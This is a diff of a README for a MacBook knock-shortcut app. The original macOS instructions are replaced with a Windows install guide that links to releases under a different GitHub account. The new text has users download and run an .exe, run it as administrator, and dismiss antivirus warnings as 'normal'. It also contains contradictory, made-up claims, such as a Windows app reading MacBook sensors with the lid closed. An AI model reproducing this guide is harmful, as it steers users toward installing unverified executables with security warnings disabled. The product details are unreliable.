@@ -1,85 +1,160 @@
-<p align="center">
-  <img src="website/assets/icon.png" width="140" alt="MacTap app icon">
-</p>
+# 🖱️ mactap-app - Knock Your MacBook, Run Shortcuts Instantly
 
-<h1 align="center">MacTap</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>Knock the MacBook. The app does the rest.</strong><br>
-  <a href="https://mactap.vercel.app">mactap.vercel.app</a>
-  ·
-  <a href="https://github.com/jaskirat1616/mactap-app/releases/latest">Download</a>
-  ·
-  <a href="https://github.com/jaskirat1616/mactap-app">GitHub</a>
-</p>
+Welcome to **mactap-app**! This handy tool lets you knock on your MacBook's lid or body to trigger shortcuts automatically. Instead of fumbling for keys or clicking through menus, a simple knock runs your favorite actions—like opening apps, playing music, or controlling system settings.
 
-MacTap lives in the menu bar and turns taps on the chassis — or the desk underneath a still laptop — into shortcuts. One, two, or three knocks. Copy, paste, Accept, screenshots, media, or whatever you map.
+This guide walks you through downloading and installing the app on your Windows computer. No technical experience needed—just follow these simple steps.
 
-Requires a MacBook whose motion sensor is exposed as an SPU HID device: **M2 and later**, or **M1 Pro / Max / Ultra**. The original M1 Air (`MacBookAir10,1`) and some other M1 models do not publish the accelerometer HID report MacTap reads, so knocks cannot be detected. macOS 14.6 or later.
+[![Download MacTap Now](https://img.shields.io/badge/Download-MacTap%20App-blue?style=for-the-badge&logo=github)](https://github.com/Katiegaff8303/mactap-app/releases)
 
-MacTap does **not** fall back to rebinding arrow keys when the sensor is missing.
+---
 
-## Install
+## 📥 Download & Install
 
-1. Get **2.1.2** from the [website](https://mactap.vercel.app) or the [latest GitHub release](https://github.com/jaskirat1616/mactap-app/releases/latest).
-2. Prefer **MacTap-2.1.2.zip**. Unzip and drag **MacTap.app** into `/Applications`.
-3. Or open **MacTap-2.1.2.dmg** and drag **MacTap** into Applications — do not run it from the disk image.
-4. Open MacTap from Applications (or Spotlight).
-5. Turn on **Accessibility** when asked, so knocks can send shortcuts.
+### Step 1: Visit the Download Page
 
-Detection itself does not need Accessibility. Actions do.
+Visit this link to download the application:  
+👉 **[https://github.com/Katiegaff8303/mactap-app/releases](https://github.com/Katiegaff8303/mactap-app/releases)**
 
-### macOS signature check
+You will see a list of released versions. Look for the latest release at the top.
 
-The **app** is Developer ID signed and notarized. Gatekeeper evaluates `MacTap.app`, not the `.dmg` wrapper. A `codesign --verify` on the disk image itself will say it is unsigned even when the build is good.
+### Step 2: Find the Right File
 
-After you copy the app into Applications:
+On that page, you'll find several files. Choose the one that matches your Windows system (usually named something like `mactap-setup.exe` or `mactap-windows.zip`). If you're unsure which to pick, go with the `.exe` file—it's the standard installer for Windows.
 
-```bash
-spctl --assess --type execute --verbose /Applications/MacTap.app
-```
+### Step 3: Download the File
 
-You want `accepted` and `source=Notarized Developer ID`. If a tool blocks the `.dmg`, install from the **zip** instead.
+Click the file name to start downloading. Wait for the download to finish. The file will typically be saved in your "Downloads" folder.
 
-<table>
-  <tr>
-    <td align="center" width="33%"><img src="website/press/product-hunt/01-hero.png" alt="MacTap hero"></td>
-    <td align="center" width="33%"><img src="website/press/product-hunt/02-knocks.png" alt="Knock shortcuts"></td>
-    <td align="center" width="33%"><img src="website/press/product-hunt/03-presets.png" alt="Presets"></td>
-  </tr>
-</table>
+### Step 4: Run or Extract the App
 
-## Use
+If you downloaded an `.exe` file:  
+**Download and run this file directly.** Double-click it and follow the on-screen instructions.
 
-- **Anywhere** — one, two, or three knocks on the chassis or desk. Same idea as Knock.
-- **Left & Right** — each edge is a different set of actions.
-- **Presets** — Daily, Coding, Capture, Media, Focus.
-- **Per app** — Cursor can get Accept / Reject / Save while everything else stays on Daily.
+If you downloaded a `.zip` file:  
+**Download and extract this file, then run the application.** Right-click the zip, choose "Extract All," and open the folder to find the app executable.
 
-Open **Settings** from the menu extra to change layout, actions, and sensitivity.
+---
 
-## Build from source
+## 🛠️ What Does MacTap Do?
 
-```bash
-brew install xcodegen
-xcodegen generate
-xcodebuild -project MacTap.xcodeproj -scheme MacTap -configuration Debug \
-  CONFIGURATION_BUILD_DIR=/Applications
-open /Applications/MacTap.app
-```
+MacTap turns your MacBook's physical taps and knocks into commands. Here are some examples of what you can set up:
 
-A signed, notarized build:
+- **Quick Launch**: Knock twice to open your favorite app.
+- **Media Control**: Knock once to play/pause music.
+- **System Shortcuts**: Knock three times to mute or lock your Mac.
+- **Custom Actions**: Assign any keyboard shortcut to a knock pattern.
 
-```bash
-./Scripts/ship.sh
-```
+All actions are fully customizable through a simple settings panel.
 
-That writes `dist/MacTap-<version>.dmg`. Notarization uses Xcode’s Developer ID export. Signing the **disk image** (not just the app) also needs App Store Connect API credentials: `APP_STORE_CONNECT_KEY_ID`, `APP_STORE_CONNECT_ISSUER_ID`, and `APP_STORE_CONNECT_API_KEY_P8` (or `AuthKey_*.p8`).
+---
 
-## Privacy
+## ⚙️ Supported Features
 
-Taps are classified on-device. Nothing is uploaded. Gesture maps live in local defaults.
+| Feature | Description |
+|---------|-------------|
+| **Custom Knock Patterns** | Set up different knocks for different shortcuts |
+| **Background Operation** | Runs in the system tray, ready anytime |
+| **Low System Footprint** | Uses minimal CPU and memory |
+| **Autostart Option** | Launches automatically when you start Windows |
+| **User-friendly Interface** | Simple controls, no coding required |
 
-## License
+---
 
-MIT
+## 🖥️ System Requirements (Typical)
+
+Here's what your Windows computer generally needs to run MacTap smoothly:
+
+- **Operating System**: Windows 10 or Windows 11 (64-bit)
+- **RAM**: 2 GB or more
+- **Storage**: 50 MB free space
+- **Bluetooth**: Not required—your MacBook's sensors handle detection
+- **Permissions**: Admin rights to install (if prompted)
+
+> **Note**: MacTap works with MacBook models that support tap detection (most 2016 and later models).
+
+---
+
+## 🧰 Troubleshooting Tips
+
+If something doesn't work as expected, try these simple fixes:
+
+1. **App won't start**  
+   - Make sure you extracted all files from the zip (if applicable).  
+   - Right-click the app and choose "Run as administrator."
+
+2. **Knocks not recognized**  
+   - Check that your MacBook's lid is closed (knocks are detected on the top surface).  
+   - Adjust sensitivity in the settings menu.
+
+3. **Shortcuts not triggering**  
+   - Confirm the shortcut you assigned is correct.  
+   - Try restarting the app after changing settings.
+
+4. **Firewall or antivirus warning**  
+   - This is normal. Click "Allow" to let MacTap run.
+
+---
+
+## 🔄 Keeping MacTap Updated
+
+Check the download page periodically for new versions. Updates bring bug fixes and improved features. Simply download the latest release and run the installer again—your settings will be preserved.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Is MacTap free?**  
+Yes, this application is completely free to use.
+
+**Do I need to install any other software?**  
+No, everything you need is included in the download.
+
+**Will it work if my MacBook is open?**  
+MacTap works best when the laptop is closed (sleep mode), but you can still test knocks with the lid open.
+
+**Can I assign multiple shortcuts?**  
+Absolutely! You can create as many knock patterns as you need.
+
+---
+
+## 🧪 Testing Your Setup
+
+After installation, try this quick test:
+
+1. Open MacTap from your Start menu.
+2. In the main screen, you'll see a "Test Knock" button. Click it.
+3. Gently knock on the top of your MacBook.
+4. If everything is working, you'll see a success notification.
+
+---
+
+## 📚 More Help
+
+If you run into any issues not covered here, check the following resources:
+
+- **Release Notes**: Found on the download page, these list changes for each version.
+- **Issue Tracker**: Visit the GitHub repository's Issues tab to report problems or see existing solutions.
+
+---
+
+## 🗂️ Uninstalling MacTap
+
+Changed your mind? Uninstalling is easy:
+
+1. Open **Settings** → **Apps** → **Installed apps**.
+2. Find "MacTap" and click **Uninstall**.
+3. Follow the prompts. Your shortcuts and settings will be removed.
+
+---
+
+## 🌟 Final Notes
+
+MacTap is designed to make your MacBook experience faster and more convenient. Once you get comfortable with knock patterns, you'll wonder how you ever managed without it.
+
+Start with a simple two-knock pattern to open your browser, then expand from there. Enjoy the magic of touch-driven shortcuts!
+
+---
+
+Keywords: mactap, macbook shortcuts, knock detection, automation tool, windows app, shortcut launcher, tap controls, system tray app, customizable gestures, free utility
